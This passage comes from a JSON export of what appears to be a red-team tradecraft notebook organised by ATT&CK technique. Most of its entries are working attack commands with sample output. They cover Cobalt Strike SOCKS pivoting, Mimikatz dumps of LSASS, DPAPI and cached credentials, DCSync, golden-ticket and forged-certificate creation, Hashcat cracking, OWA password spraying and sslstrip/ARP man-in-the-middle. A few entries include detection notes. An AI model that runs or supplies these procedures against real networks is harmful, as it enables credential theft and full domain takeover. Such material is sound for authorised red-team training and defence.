        "content": "# Socks Proxy\n\n## Setup SOCKS via Cobalt Strike\n``````beacon\nbeacon> socks 1080\n[+] started SOCKS4a server on: 1080\n``````\n\nThis will bind port 1080 on the Team Server.\n``````bash\nroot@kali:~# ss -lpnt\nState   Recv-Q  Send-Q  Local Address:Port Peer Address:Port    Process\nLISTEN  0       128     .:1080             .:*                  users:((\"java\",pid=1222,fd=11))\n``````\n\n#opsec This binds 1080 on all interfaces and since there is no authentication available on SOCKS4, this port can technically be used by anyone.\nAlways ensure your Team Server is adequately protected and never exposed directly to the Internet.\n\n## Tunnel Windows\nWe can tunnel GUI apps that run on Windows using a proxy client such as [[Proxifier]].\n\n### RunAs\nSome applications (such as the RSAT tools) don't provide a means of providing a username or password, because they're designed to use a user's domain context. You can still run these tools on your attacking machine. If you have the clear text credentials, use `runas /netonly`.\n\n``````powershell\nC:\\>runas /netonly /user:EDU\\patrick \"C:\\windows\\system32\\mmc.exe C:\\windows\\system32\\dsa.msc\"\nEnter the password for EDU\\patrick:\nAttempting to start C:\\windows\\system32\\mmc.exe C:\\windows\\system32\\dsa.msc as user \"EDU\\patrick\" ...\n``````\n\n### Mimikatz\nYou can use [[Mimikatz#Spawn process with injected credentials]] - [[Pass-the-Hash]]\n\n\n## Tools\n########\n########",
        "category": "Pivoting",
        "stealthy": false,
        "changes": [
            "\n## [[NMAP]]\nNmap example via proxychains:\n``````sh\nproxychains nmap -n -Pn -sT -p445,3389,5985 10.10.1.20\n``````\n\u26a0\ufe0fICMP and SYN scans cannot be tunnelled, so we must disable ping discovery (`-Pn`) and specify TCP scans (`-sT`) for this to work",
            "\n## [[Proxifier]]\n#opsec You can enable DNS lookups through Proxifier, but that will cause DNS leaks from your computer into the target environment.\n\nOpen **Proxifier**, go to **Profile > Proxy Servers** and **Add** a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.\n![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/proxy-servers.png)\n\nNext, go to **Profile > Proxification Rules**. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I'm creating a single rule for **adexplorer64.exe** (part of the Sysinternals Suite). When this application tries to connect to a target host within the **10.10.17.0/24** subnet (**edu.evil.corp**), it will be automatically proxied through the Cobalt Strike proxy server defined above.\n\n![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/proxy-rule.png)\n\nNow launch ADExplorer and connect to **10.10.17.71** (DC-2).\n![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/ad-connect.png)\n\nYou will then see the traffic being proxied in Proxifier, and ADExplorer connects successfully.\n![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/adexplorer.png)",
            "\n## [[Proxychains]]\n1. Change configuration:\n   ```bash\n    nano /etc/proxychains.conf\n    - comment out the last line\n    + Socks5 127.0.0.1 8080\n    ```\n2. Use proxychains:\n    `proxychains4 nmap -sT -p- 10.0.0.0/24`",
            "\n## [[WMIexec]]\n``````sh\nproxychains python3 /usr/local/bin/wmiexec.py EDU/john@10.10.1.20\n``````"
        ],
        "tools": [
            "NMAP",
            "Proxifier",
            "Proxychains",
            "WMIexec"
        ],
        "steps": []
    },
    {
        "id": "5c704518-7314-4972-a66a-9e0914a2d7af",
        "name": "Cached Domain Credentials",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.005",
        "external": false,
        "description": "NoDescription",
        "content": "# Cached Domain Credentials\nCached Domain Credentials were designed for instances where domain credentials are required to logon to a machine, even whilst offline.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\nUnfortunately, the hash format is not NTLM.\n\nTo crack these with [[Hashcat]], we need to transform them into the expected format. The [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us it should be `$DCC2$<iterations>#<username>#<MsCacheV2hash>`.\n\n``````\nbeacon> mimikatz lsadump::cache\n\nDomain : SRV1\nSysKey : 5d11b46a92921b8775ca574306ba5355\n\nLocal name : SRV1 ( S-1-5-21-4124990477-354564332-720757739 )\nDomain name : EDU ( S-1-5-21-3263068140-2042698922-2891547269 )\nDomain FQDN : edu.evil.corp\n\nPolicy subsystem is : 1.14\nLSA Key(s) : 1, default {2f242789-b6b3-dc42-0903-3e03acab0bc2}\n  [00] {2f242789-b6b3-dc42-0903-3e03acab0bc2} c09ac7dd10900648ef451c40c317f8311a40184b60ca28ae78c9036315bf8983\n\n* Iteration is set to default (10240)\n\n[NL$1 - 2/25/2022 1:07:37 PM]\nRID       : 00000460 (1120)\nUser      : EDU\\john\nMsCacheV2 : 98e6eec9c0ce004078a48d4fd03f2419\n\n[NL$2 - 5/17/2022 2:00:46 PM]\nRID       : 0000046e (1134)\nUser      : EDU\\svc_mssql\nMsCacheV2 : 3f903860f7b6861a702eb9d6509d9da6\n\n[NL$3 - 5/17/2022 2:00:50 PM]\nRID       : 00000462 (1122)\nUser      : EDU\\doe\nMsCacheV2 : 673e2fe26e26e79c58379168b79890f6\n``````"
        ],
        "tools": [
            "Mimikatz"
        ],
        "steps": []
    },
    {
        "id": "d0287ca0-5103-4aaf-9eb4-0af85d656dc8",
        "name": "Crack Credentials",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1110",
        "external": false,
        "description": "Cracking different hashes to recover the password in the plaintext format.",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Hashcat]]\n## Cracking NTLM\n``````sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 1000 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n``````\n\n``````beacon\nhashcat.exe -a 3 -m 1000 C:\\Temp\\ntlm.txt ?u?l?l?l?l?l?l?l?d\n``````\n\n## Cracking krb5tgs\n``````sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 13100 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n``````\n\n## Cracking krb5asrep\n``````sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 18200 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n``````\n\n## Cracking netntlmv2\n```sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 5600 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n```",
            "\n## [[John the Ripper]]\nCracking netntlmv2\n```sh\n--format=netntlmv2 --wordlist=wordlist svc_mssql-netntlmv2\n```"
        ],
        "tools": [
            "Hashcat",
            "John the Ripper"
        ],
        "steps": []
    },
    {
        "id": "74baeff6-47ad-418a-be6a-01078da21066",
        "name": "Credential Prompt",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1056.002",
        "external": false,
        "description": "Creating a fake credential prompt could lead to the recovery of plaintext credentials",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "fd9a1c16-c972-424a-a1f0-6a4e96067a2f",
        "name": "Data Protection API (DPAPI)",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1555",
        "external": false,
        "description": "NoDescription",
        "content": "# DPAPI\n\nThe Data Protection API (DPAPI) is a component built into Windows that provides a means for encrypting and decrypting data \"blobs\". It uses crypto keys that are bound to either a specific user or computer account and allows Windows and external applications to protect or unprotect data.\n\nDPAPI is used by the Windows Credential Manager to store saved secrets such as RDP credentials, and others like Google Chrome.\n\nThe credential manager blobs are stored in the user's `AppData` directory.\n>ls C:\\Users\\$env:username\\AppData\\Local\\Microsoft\\Credentials\n\nThe native `vaultcmd` tool can also be used to list them.\n>beacon> run vaultcmd /listcreds:\"Windows Credentials\" /all\n\nIf size not null some creds are saved\n>ls C:\\Users\\$env:username\\AppData\\Local\\Google\\Chrome\\User Data\\Default\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\n#OPSEC Not recommended. Try gathering it from the DC\n\n>mimikatz vault::list\n>mimikatz sekurlsa::dpapi\n\n## Extract passwords locally\n1. Get subfolder path of {SID}\n``````sh\nGet-ChildItem C:\\Users\\$env:username\\AppData\\Roaming\\Microsoft\\Protect\\{SID}\\xxx\n\n Mode                 LastWriteTime         Length Name\n ----                 -------------         ------ ----\n -a-hs-        16.03.2022     13:00            468 29deba8c-55de-4930-97d5- 7d949402541b\n -a-hs-        16.03.2022     13:01            468 c3b72001-5fd0-4a1d-b548- b4e6fcecd431\n -a-hs-        24.01.2022     20:00             24 Preferred\n``````\n\n2. Choose one of the encrypted creds\n``````powershell\nGet-ChildItem -Hidden C:\\Users\\$env:username\\AppData\\Local\\Microsoft\\Credentials\n\n Mode                 LastWriteTime         Length Name\n ----                 -------------         ------ ----\n -a-hs-        05.01.2022     20:00           3252 040F76937B2E54B70658AF91D1BEBCCF\n -a-hs-        15.03.2022     14:06           3012 0437BF9439473166B0F4C16EC80BC809\n``````\n\n3. Check for guid masterkey of encrypted creds via [[Mimikatz]]\n``````powershell\ndpapi::cred /in:C:\\Users\\patri\\AppData\\Local\\Microsoft\\Credentials\\040F76937B2E54B70658AF91D1BEBCCF\n\n**BLOB**\n  dwVersion          : 00000001 - 1\n  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}\n  dwMasterKeyVersion : 00000001 - 1\n  guidMasterKey      : {c3b72001-5fd0-4a1d-b548-b4e6fcecd431}\n``````\n\n4. Get DPAPI master key listed in 3 as guidMasterKey.\n``````powershell\ndpapi::masterkey /in:C:\\Users\\patri\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3318663386-1925972964-1342212060-1001\\c3b72001-5fd0-4a1d-b548-b4e6fcecd431 /rpc\n\n# OR VIA LOCAL IF NOT DOMAIN JOINED\nsekurlsa::dpapi\n\nAuthentication Id : 0 ; 658810602 (00000000:2744a6ea)\nSession           : Interactive from 3\nUser Name         : patri\nDomain            : PHANTOM\nLogon Server      : (null)\nLogon Time        : 16.03.2022 12:59:58\nSID               : S-1-5-21-3318663386-1925972964-1342212060-1001\n         [00000000]\n         * GUID      :  {c3b72001-5fd0-4a1d-b548-b4e6fcecd431}\n         * Time      :  16.03.2022 13:07:03\n         * MasterKey :  877b54004621de000414e1e85af59928027d55f6be31beafd8007ad21779e3eb75ec95b58ebcedf4333a7c38c[SNIP]21f9ba45cb6a1ea974839762\n         * sha1(key) :  71e8820de4c5f31bc7d81c44ed85bcc720e46536\n         [00000001]\n         * GUID      :  {29deba8c-55de-4930-97d5-7d949402541b}\n         * Time      :  16.03.2022 13:32:13\n         * MasterKey :  976241ce72ce24871d8b5c05775549a8025e4a8d8c52594c57d7d8206dd5d4f0889c9a242d2fed8b562c703f82[SNIP]091ce38cbb27346be13abef8\n         * sha1(key) :  c27a0c1eb6a9b65c698cad771fa6346e3517e148\n``````\n\n5. decrypt file from 2 with key from 4.\n``````powershell\ndpapi::cred /in:C:\\Users\\patri\\AppData\\Local\\Microsoft\\Credentials\\040F76937B2E54B70658AF91D1BEBCCF /masterkey:877b54004621de000414e1e85af59928027d55f6be31beafd8007ad21779e3eb75ec95b58ebcedf433[SNIP]21f9ba45877b1426c72cb\n``````",
            "\n## [[SharpChromium]]\nDump the Chrome passwords\n``````beacon\nbeacon> execute-assembly C:\\Tools\\SharpChromium\\bin\\Debug\\SharpChromium.exe logins\n\n[*] Beginning Google Chrome extraction.\n\n--- Chromium Credential (User: john) ---\nURL      : \nUsername : john\nPassword : Sup3rman\n\n[*] Finished Google Chrome extraction.\n[*] Done.\n``````",
            "\n## [[SharpDPAPI]]\nDump private keys but requires [[SharpDPAPI#Dump private keys]]\n```beacon\nbeacon> run hostname\ndc-1\n\nbeacon> getuid\n[*] You are NT AUTHORITY\\SYSTEM (admin)\n\nbeacon> execute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Debug\\SharpDPAPI.exe certificates /machine\n```\n ![](/Images/Pasted%20image%2020220322003615.png)"
        ],
        "tools": [
            "Mimikatz",
            "SharpChromium",
            "SharpDPAPI"
        ],
        "steps": []
    },
    {
        "id": "ad973bb9-b8aa-4b9f-a8be-899c610416d7",
        "name": "DCSync",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.006",
        "external": false,
        "description": "NoDescription",
        "content": "# DCSync\nDCSync is a technique which replicates the MS-DRSR protocol to replicate AD information, including password hashes. Under normal circumstances, this is only ever performed by (and between) Domain Controllers. There are specific DACLs relating to DCSync called **Replicating Directory Changes \\[All/In Filtered Set\\]**, which by default is only granted to Enterprise/Domain Admins and Domain Controllers.\n\nThese are set on the root domain object. Enterprise/Domain Admins can grant the Replicating Directory Change rights to other users, groups or computers.\n\n1. Assign an additional attacker controlled user DCsync rights. [[PowerView#Assign rights DCSync]]\n2. Perform a DCSync for the `EDU\\krbtgt` which can create a golden ticket for everyone.\n```beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> dcsync edu.evil.corp EDU\\krbtgt\n[DC] 'edu.evil.corp' will be the domain\n[DC] 'dc-2.edu.evil.corp' will be the DC server\n[DC] 'EDU\\krbtgt' will be the user account\n\n[...snip...]\n\n* Primary:Kerberos-Newer-Keys *\n Default Salt : EDU.EVIL.IO/krbtgt\n Default Iterations : 4096\n Credentials\n aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa\n aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822\n des_cbc_md5       (4096) : b9fefed6da865732\n```\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "10308992-7220-4fa9-8eea-ba7a2deaf61f",
        "name": "eKeys",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# eKeys\nSince most Windows services choose to use [[Kerberos]] over NTLM, leveraging these over NTLM hashes makes more sense for blending into normal authentication traffic.\n\nIf available, the **aes256_hmac** and **aes128_hmac** attributes are prefered and used via [[Overpass-the-Hash]].\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\nThis Mimikatz module will dump [[Kerberos]] encryption keys.\n``````beacon\nbeacon> mimikatz sekurlsa::ekeys\n\nAuthentication Id : 0 ; 113277 (00000000:0001ba7d)\nSession           : Interactive from 1\nUser Name         : doe\nDomain            : EDU\nLogon Server      : DC-2\nLogon Time        : 5/24/2022 9:00:11 AM\nSID               : S-1-5-21-3263068140-2042698922-2891547269-1122\n\n * Username : doe\n * Domain   : edu.evil.corp\n * Password : (null)\n * Key List :\n aes256_hmac       a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1\n rc4_hmac_nt       4ffd3eabdce2e158d923ddec72de979e\n rc4_hmac_old      4ffd3eabdce2e158d923ddec72de979e\n rc4_md4           4ffd3eabdce2e158d923ddec72de979e\n rc4_hmac_nt_exp   4ffd3eabdce2e158d923ddec72de979e\n rc4_hmac_old_exp  4ffd3eabdce2e158d923ddec72de979e\n``````"
        ],
        "tools": [
            "Mimikatz"
        ],
        "steps": []
    },
    {
        "id": "3e2a5a7d-c1b0-42b3-98d0-17cb6941f9d1",
        "name": "Extract Kerberos Tickets",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1558",
        "external": false,
        "description": "Extract kerberos ticket from memory",
        "content": "# Extract Kerberos Tickets\nIt is possible to extract all kerberos tickets via [[Rubeus#Extract Kerberos Tickets]] of\n* logged on users with admin rights\n* kerberos tickets of an user with user rights via \n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "9e7744a0-ed8a-4ebb-a832-4d5f8cd94170",
        "name": "Forged Certificates",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1588.004",
        "external": false,
        "description": "NoDescription",
        "content": "# Forged Certificates\nThe AD CS roles can either be installed on separate servers or on domain controllers. \nForging certs can be used as\n* Privilege Escalation if accessible by non-domain admins\n* domain persistence method by creating (with priv key) certificates which can be used to request TGTs\n\nThe default validity period for a CA private key is 5 years, but can be set to any value during the setup.\n\nOnce on a CA, [[SharpDPAPI]] can extract the private keys.\n\n1. [[SharpDPAPI#Dump private keys]]\n2. Save the output to a `.pem` file and convert it to a `.pfx` with openssl on Kali, then move it back to the attacker machine.\n3. Build the forged certificate with [[ForgeCert#Generate certificate with stolen pk]].\n4. Use [[Rubeus#Ask TGT via certificate]] to request a legitimate TGT with this forged certificate and use it to access the domain controller.\n5. [[Use Kerberos ticket (kirbi)]]\n\nWe're not limited to forging user certificates, we can do the same for machines. Combine this with the [[S4U2self Abuse]] trick to gain access to any machine or service in the domain.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[ForgeCert]]\nGenerate certificate with stolen pk\n```beacon\nC:\\Users\\Administrator\\Desktop>C:\\Tools\\ForgeCert\\ForgeCert\\bin\\Debug\\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword \"password\" --Subject \"CN=User\" --SubjectAltName \"Administrator@evil.corp\" --NewCertPath fake.pfx --NewCertPassword \"password\"\nCA Certificate Information:\n  Subject:        CN=ca-1, DC=evil, DC=corp\n  Issuer:         CN=ca-1, DC=evil, DC=corp\n  Start Date:     2/25/2022 11:29:14 AM\n  End Date:       2/25/2047 11:39:08 AM\n  Thumbprint:     7F8A1EFB7A50E2D1DE098085301926AA13AE0A71\n  Serial:         31AC83C6678F28994CFB58207C9FB668\n\nForged Certificate Information:\n  Subject:        CN=User\n  SubjectAltName: Administrator@evil.corp\n  Issuer:         CN=ca-1, DC=evil, DC=corp\n  Start Date:     3/1/2022 2:19:20 PM\n  End Date:       3/1/2023 2:19:20 PM\n  Thumbprint:     73C45EC22357C0451E0F374AC30B5C6F6034B132\n  Serial:         009E1C0AE8A247695199F8157DB37E38AD\n\nDone. Saved forged certificate to fake.pfx with the password 'password'\n```"
        ],
        "tools": [
            "ForgeCert"
        ],
        "steps": []
    },
    {
        "id": "2292b5f8-33d3-41de-bb90-17bf0b9679bd",
        "name": "Golden Ticket",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1558.001",
        "external": false,
        "description": "Extract kerberos ticket from memory",
        "content": "# Golden Tickets\nA Golden Ticket is a forged TGT. In comparison to a Silver Ticket, which impersonates a single service or a single machine, a Golden Ticket can be used to impersonate either a choosen user, service, or machine.\n\n* Create silver tickets: [[Mimikatz#Create silver ticket]]\n* Create golden tickets: [[Mimikatz#Create golden ticket]]\n\n## Detection\nNetwork:\n- Lifetime with mimikatz is abnormal 10 years\n\nWindows logs:\n- Seeing 4769's _without_ a prior 4768.\n  It's not possible to request a TGS without a TGT. No record of a TGT being issued -> forged offline.\n- Alert on 4769's for sensitive users such as the default domain administrator account.\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\n### Create golden ticket (user)\n#OPSEC Specify the lifetime (mimikatz does abnormal 10 years)\nUse the `/startoffset`, `/endin` and `/renewmax` parameters to control the start offset, duration and the maximum renewals (all in minutes).\n\n1. Get DC [[PowerView#Get-DomainController]] \n2. [[PowerView#Get-DomainSID]]\n3. [[DCSync]] the krbtgt user\n4. Generate [[Golden Ticket]] as follows:\nWhere:\n-   `/user` is the username to impersonate : see 2\n-   `/domain` is the current domain name : see 1\n-   `/sid` is the current domain SID. : see 2\n-   `/aes256` is the AES256 key for the krbtgt : see 3\n-   `/ticket` is the filename to save the ticket as.\n```beacon\nmimikatz # kerberos::golden /user:Administrator /domain:edu.evil.corp /sid:S-1-5-21-3263068140-2042698922-2891547269 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /ticket:golden.kirbi\nUser      : Administrator\nDomain    : edu.evil.corp (EDU)\nSID       : S-1-5-21-3263068140-2042698922-2891547269\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nServiceKey: 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa - aes256_hmac\nLifetime  : 3/11/2022 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM\n-> Ticket : golden.kirbi\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nFinal Ticket Saved to file !\n```\n3. [[Use Kerberos ticket (kirbi)]]"
        ],
        "tools": [
            "Mimikatz"
        ],
        "steps": []
    },
    {
        "id": "9f70b922-eff9-4fdf-afd2-516d881f926a",
        "name": "Internal Phishing",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1566",
        "external": false,
        "description": "Internal phishing campagne",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Espoofer]]\n[[Phishing]]\nChecking for spoofable header",
            "\n## [[MailSniper]]\n[[Phishing]]\nGet internal domain names\n``````\nipmo C:\\Tools\\MailSniper\\MailSniper.ps1\nInvoke-DomainHarvestOWA -ExchHostname 10.10.15.100\n\n[*] Harvesting domain name from the server at 10.10.15.100\nThe domain appears to be: EDU or evil.corp\n``````\n\n Password spray\n``````\nInvoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\\valid.txt -Password Summer2022\n\n[*] Now spraying the OWA portal at https://10.10.15.100/owa/\n[*] SUCCESS! User:EDU\\patrick Password:Summer2022\n[*] A total of 1 credentials were obtained.\n``````",
            "\n## [[spoofcheck]]\n[[Phishing]]\nSimple script that checks a domain for email protections."
        ],
        "tools": [
            "Espoofer",
            "MailSniper",
            "ruler",
            "spoofcheck"
        ],
        "steps": []
    },
    {
        "id": "2f75ecae-8b39-47ba-8a12-619404b8ea10",
        "name": "Keylogging",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1056.001",
        "external": false,
        "description": "Creating a fake credential prompt could lead to the recovery of plaintext credentials",
        "content": "",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "5f16f80a-3a0b-4987-868a-4ec7ef59f789",
        "name": "LSA Secrets",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.004",
        "external": false,
        "description": "NoDescription",
        "content": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets. LSA secrets can also be dumped from memory.",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "aa055bc4-2f48-437d-bca5-ec1f82985f19",
        "name": "LSASS dumping",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.001",
        "external": false,
        "description": "NoDescription",
        "content": "# LogonPasswords\nThis feature retrieves NTLM hashes which can be used with [[Pass-the-Hash]] or cracking to recover the plain-text.\n\n#OPSEC A lot of tradecraft that leverages NTLM are undesirable.\n-   [[Pass-the-Hash]] requires patching LSASS.\n-   [[Overpass-the-Hash]] with NTLM uses a weaker encryption compared to what Windows uses by default.\n\n-> Better use [[eKeys]] to get the AES and [[Overpass-the-Hash]]\n\nOr just dump it via TASKMANAGER and exfiltrate it to then run mimikatz on it locally!",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Dumpert]]\n",
            "\n## [[Handlekatz-BOF]]\n*Make all* to build handlekatz.x64.o and handlekatz_bof.cna`\nPut them into the same folder and load the .cna script.\n`handlekatz <lsass-pid> C:\\Windows\\Temp\\sql.bin`",
            "\n## [[Handlekatz]]\n*Make all* to build HandleKatzPIC.exe, HandleKatz.bin and loader.exe`\nLoader implements a sample loader for HandleKatz:\n> loader.exe --pid:7331 --outfile:C:\\Temp\\dump.obfuscated\n> python3 /mnt/c/Users/patri/source/repos/HandleKatz/Decoder.py -i \"/mnt/c/Users/patri/Downloads\ndon/sql2.bin\" -o \"/mnt/c/Users/patri/Downloads/sql2.dmp\"\n> .\\mimikatz.exe \"log C:\\Users\\patri\\Downloads\\log.txt\" \"sekurlsa::minidump C:\\Users\\patri\\Downloads\\sql2.bin\" \"sekurlsa::logonPasswords\"\n> C:\\Users\\patri\\Documents\\Red-Teaming\\credentials\\KatzKatz-ExtractNTLM\\katzkatz.py -f C:\\Users\\patri\\Downloads\\Garmaredon\\log.txt",
            "\n## [[Mimikatz]]\n``````\nbeacon> mimikatz sekurlsa::logonpasswords\n``````",
            "\n## [[MiniDump]]\n",
            "\n## [[physmem2profit]]\n1. Run on the target as admin\n> physmem2profit.exe [--ip IP] [-p PORT] [--hidden] [--verbose]\n2. You can download the signed Winpmem driver [here](https://github.com/Velocidex/WinPmem/raw/master/kernel/binaries/winpmem_x64.sys). This driver needs to be present on the target host.\n3. Run on the attacking machine. This command will activate the virtualenv created by install.sh.\n> source physmem2profit/client/.env/bin/activate \n4. Run on the attacking machine\n> cd physmem2profit/client and python3 physmem2profit --host HOST [--port PORT] [--mode MODE] [--driver DRIVER ] [--instal DRIVER_PATH_ON_TARGET] [--label LABEL_FOR_MEMORY_DUMP]\n- physmem2profit.exe needs to be running on the target machine before you run this command.\n- This will write the LSASS minidump to output/[label]-[date]-lsass.dmp on the attacking machine.\n5. Copy the minidump to a Windows system and run mimikatz\n> mimikatz.exe \"sekurlsa::minidump [label]-[date]-lsass.dmp\" \"sekurlsa::logonpasswords\" \"exit\""
        ],
        "tools": [
            "Dumpert",
            "Handlekatz-BOF",
            "Handlekatz",
            "Mimikatz",
            "MiniDump",
            "physmem2profit"
        ],
        "steps": []
    },
    {
        "id": "00e83897-8668-4d5d-9888-8ff0d7c4acfe",
        "name": "Make Token",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Make Token\nThe Cobalt Strike command `make_token` uses the [LogonUserA](https://docs.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-logonusera) to get a process handle with the users token. For that it requires the username, domain and plaintext password and the logon type **LOGON32_LOGON_NEW_CREDENTIALS**.\n\nFrom MS:\n> This logon type allows the caller to clone its current token and specify new credentials for outbound connections. The new logon session has the same local identifier but uses different credentials for other network connections.\n\nThe local identifier stays the same since it uses the own token!  \n* `getuid` stays  **EDU\\john**\n* network connections use new user token\n* no local admin privs are required\n* To revert the token, use `rev2self`.\n\n``````beacon\nbeacon> getuid\n[*] You are EDU\\john\nbeacon> ls \\\\srv2\\c$\n[-] could not open \\\\srv2\\c$\\*: 5\nbeacon> make_token EDU\\doe Passw0rd1\n[+] Impersonated EDU\\john\nbeacon> ls \\\\srv2\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/10/2022 04:11:30   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n ``````\n\n\n## Detection\n* Event `4624: An account was successfully logged on` with Logon Type: `LOGON32_LOGON_NEW_CREDENTIALS` (type `9`).  \n>event.code: 4624 and winlog.event_data.LogonType: 9\n* Windows commands such as RunAs will also generate the same event.\n* Records contain the user who ran the command, the user they're impersonating, and the process it was run from.\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "87ca2738-4ac8-4533-8d43-c897da75f590",
        "name": "MITM",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T0830",
        "external": false,
        "description": "NoDescription",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Bettercap]]\n```java\nbettercap -G 192.168.1.1 -T 192.168.1.102 --proxy-https\n```",
            "\n## [[Ettercap]]\nRun ettercap with UI\n\n```bash\nsudo ettercap -G\n```\n\n1.  Select mode  \n    **Unified**: sniff  \n    **Bridged:** sniff and forward\n2.  Select interface\n3.  Host list \u2192 add target 1 (gateway) + add target 2 (host)\n4.  Select attack (ARP poisoning, ICMP redirect, Port Stealing. DHCP spoofing)\n5.  Check the MAC  \n    Windows: arp -a  \n    Linux: arp\n6.  View \u2192 Connections\n\n**SSL/TLS decryption**\n\n*   change /etc/etthercap/etter.conf  \n    +- ec\\_uid = 0  \n    +- ec\\_gid = 0  \n    \\+ redir\\_command\\_on  \n    \\+ redir\\_command\\_off",
            "\n## [[sslstrip]]\n![](/Images/Tools/4618cef1-9c6f-41a2-b7ba-bd5e41ff22ad.png)\n\nThere are some issues that present themselves in this type of attack for example:\n\n*   Some content-encoding, such as gzip, is difficult to parse.\n*   Cookies that are sent over HTTPS will not be sent over HTTP that has striped the SSL.\n*   Any cached pages which did not have the links swapped out\n\nIn order to counter these shortcomings, sslstrip actually Strips parts of the requests for this information:\n\n*   Stopping the secure bit on the _Set-Cookie_ statements on the pages\n*   Strip the difficult encodings from the client requests\n*   Strip the _if-modified-since_ headers to eliminate the cached pages being requested\n\nHow to proceed:\n\n1.  Enable IP forwarding\n2.  Setup port redirection using iptables\n3.  Start sslstrip on port 8080, -w save logs into file, -f replace favicon\n4.  Start ARP MitM between victim and gateway\n    ```java\n    echo 1 > /proc/sys/net/ipv4/ip_forward\n    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080\n    sslstrip -a -f -l 8080 -w els-sslt\n    ```"
        ],
        "tools": [
            "Bettercap",
            "Ettercap",
            "sslstrip"
        ],
        "steps": []
    },
    {
        "id": "8322df56-6eed-4862-b871-675bcbcdc8b5",
        "name": "NTDS",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.003",
        "external": false,
        "description": "NoDescription",
        "content": "",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
